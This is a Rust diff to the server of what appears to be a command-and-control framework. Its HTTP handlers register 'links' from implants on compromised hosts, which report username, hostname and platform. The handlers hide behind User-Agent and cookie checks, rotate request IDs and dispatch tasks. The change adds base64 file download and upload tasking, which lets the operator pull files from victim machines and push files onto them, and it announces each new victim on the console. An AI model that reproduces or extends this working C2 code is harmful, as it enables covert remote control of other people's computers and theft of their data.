@@ -42,6 +42,18 @@ struct TaskResponse {
     tasking: String,
     /// Rolling request ID; implant must echo this on the next call.
     x_request_id: String,
+    /// For file download tasks, contains base64 encoded file content
+    #[serde(skip_serializing_if = "Option::is_none")]
+    file: Option<String>,
+    /// For file download tasks, contains the original file name
+    #[serde(skip_serializing_if = "Option::is_none")]
+    filename: Option<String>,
+    /// For file upload tasks, contains base64 encoded file content to upload
+    #[serde(skip_serializing_if = "Option::is_none")]
+    upload: Option<String>,
+    /// For file upload tasks, contains the destination path
+    #[serde(skip_serializing_if = "Option::is_none")]
+    upload_path: Option<String>,
 }
 
 // ── Header guards ───────────────────────────────────────────────────────────
@@ -51,6 +63,16 @@ fn ua_ok(req: &HttpRequest) -> bool {
         .get("User-Agent")
         .and_then(|v| v.to_str().ok())
         .is_some_and(|ua| ua == IMPLANT_UA)
+}
+
+fn parse_file_response(response: &str) -> Option<(String, String)> {
+    if response.starts_with("FILE:") {
+        let parts: Vec<&str> = response.splitn(3, ':').collect();
+        if parts.len() == 3 {
+            return Some((parts[1].to_string(), parts[2].to_string()));
+        }
+    }
+    None
 }
 
 fn cookie_ok(req: &HttpRequest) -> bool {
@@ -87,7 +109,7 @@ pub async fn stage2_handler(
         return HttpResponse::NotFound().finish();
     }
 
-    let mut links = data.links.lock().unwrap();
+    let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
     let link = links.add_link(
         body.link_username.clone(),
         body.link_hostname.clone(),
@@ -101,6 +123,10 @@ pub async fn stage2_handler(
         q: String::new(),
         tasking: String::new(),
         x_request_id: link.x_request_id.to_string(),
+        file: None,
+        filename: None,
+        upload: None,
+        upload_path: None,
     };
     let link_name = link.name.clone();
     drop(links);
@@ -112,6 +138,12 @@ pub async fn stage2_handler(
         body.link_hostname,
         body.platform
     );
+
+    // Print notification to console
+    crate::ui::print_cyan_bold(&format!(
+        "[+] New link arrived: {} ({}@{}) [{}]",
+        link_name, body.link_username, body.link_hostname, body.platform
+    ));
 
     HttpResponse::Ok().json(resp)
 }
@@ -135,9 +167,12 @@ pub async fn stage3_handler(
         return HttpResponse::BadRequest().finish();
     };
 
-    let mut links = data.links.lock().unwrap();
+    let link_id = {
+        let links = data.links.lock().unwrap_or_else(|e| e.into_inner());
+        links.find_by_request_id(x_req_id).map(|l| l.id)
+    };
 
-    let Some(link_id) = links.find_by_request_id(x_req_id).map(|l| l.id) else {
+    let Some(link_id) = link_id else {
         return HttpResponse::NotFound().finish();
     };
 
@@ -145,7 +180,8 @@ pub async fn stage3_handler(
     if !body.tasking.is_empty() {
         if let Ok(task_id) = Uuid::parse_str(&body.tasking) {
             if !body.q.is_empty() {
-                let (link_name, cli_cmd) = links
+                let links_guard = data.links.lock().unwrap_or_else(|e| e.into_inner());
+                let (link_name, cli_cmd): (String, String) = links_guard
                     .get_link(link_id)
                     .map(|l| {
                         let cmd = l
@@ -157,40 +193,80 @@ pub async fn stage3_handler(
                         (l.name.clone(), cmd)
                     })
                     .unwrap_or_else(|| ("unknown".into(), String::new()));
+                let is_download = cli_cmd.starts_with("download ");
+                // Release the lock before re-acquiring it below; std::sync::Mutex is
+                // not reentrant — holding it across the inner lock() would deadlock.
+                drop(links_guard);
 
-                const OUTPUT_BOX_WIDTH: usize = 54;
-                let now = chrono::Local::now().format("%H:%M:%S");
-                let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
-                let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
-                tracing::info!(
-                    "\n{}",
-                    format!("╔{}{}╗", header_text, "═".repeat(pad))
-                        .cyan()
-                        .bold()
-                );
-                tracing::info!("{}", body.q);
-                tracing::info!(
-                    "{}\n",
-                    format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold()
-                );
+                // Handle file download response
+                if is_download && body.q.starts_with("FILE:") {
+                    if let Some((file_path, file_content)) = parse_file_response(&body.q) {
+                        let mut links_mut = data.links.lock().unwrap_or_else(|e| e.into_inner());
+                        if let Some(link) = links_mut.get_link_mut(link_id) {
+                            if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
+                                task.file_name = Some(file_path.clone());
+                                task.file_content = Some(file_content);
+                                task.output =
+                                    format!("[+] File downloaded successfully: {}", file_path);
+                            }
+                        }
+                    }
+                } else {
+                    const OUTPUT_BOX_WIDTH: usize = 54;
+                    let now = chrono::Local::now().format("%H:%M:%S");
+                    let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
+                    let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
+                    // Print to console UI
+                    crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
+                    crate::ui::print(&format!("║ {}", body.q));
+                    crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
+
+                    tracing::info!(
+                        "\n{}",
+                        format!("╔{}{}╗", header_text, "═".repeat(pad))
+                            .cyan()
+                            .bold()
+                    );
+                    tracing::info!("{}", body.q);
+                    tracing::info!(
+                        "{}\n",
+                        format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold()
+                    );
+                }
             }
-            links.complete_task(link_id, task_id, body.q.clone());
+            let mut links_mut = data.links.lock().unwrap_or_else(|e| e.into_inner());
+            links_mut.complete_task(link_id, task_id, body.q.clone());
         }
     }
 
     // Rotate request ID
     let new_x_req_id = Uuid::new_v4();
-    links.update_checkin(link_id, new_x_req_id);
+    let (q, tasking, file, filename, upload, upload_path);
+    {
+        let mut links_mut = data.links.lock().unwrap_or_else(|e| e.into_inner());
+        links_mut.update_checkin(link_id, new_x_req_id);
 
-    // Dispatch next waiting task, if any
-    let (q, tasking) = links
-        .get_next_task(link_id)
-        .map(|t| (t.command, t.id.to_string()))
-        .unwrap_or_default();
+        // Dispatch next waiting task, if any
+        let task_data = links_mut.get_next_task(link_id).map(|data| {
+            (
+                data.command,
+                data.task_id,
+                data.file_content,
+                data.file_name,
+                data.upload_content,
+                data.upload_path,
+            )
+        });
+        (q, tasking, file, filename, upload, upload_path) = task_data.unwrap_or_default();
+    }
     let resp = TaskResponse {
         q,
         tasking,
         x_request_id: new_x_req_id.to_string(),
+        file,
+        filename,
+        upload,
+        upload_path,
     };
 
     HttpResponse::Ok().json(resp)
